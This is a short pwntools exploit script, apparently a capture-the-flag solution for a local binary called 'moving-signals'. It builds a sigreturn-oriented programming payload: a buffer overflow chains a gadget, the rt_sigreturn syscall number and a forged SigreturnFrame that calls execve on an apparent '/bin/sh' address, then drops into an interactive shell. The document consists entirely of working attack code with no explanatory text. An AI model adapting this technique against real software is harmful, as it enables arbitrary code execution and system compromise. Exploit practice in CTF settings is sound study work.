#!/usr/bin/env python3


from pwn import *

context.arch = "amd64"

e = ELF("./moving-signals")
r = process("./moving-signals")

def sig():
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = 0x3b 
    frame.rdi = 0x41250
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = 0x41015
    frame.rsp = 0x41258
    return frame
frame = sig()
exploit = b"A" * 8 + p64(0x41018) + p64(0xf) + p64(0x41015) + bytes(frame)
r.send(exploit)
r.interactive()
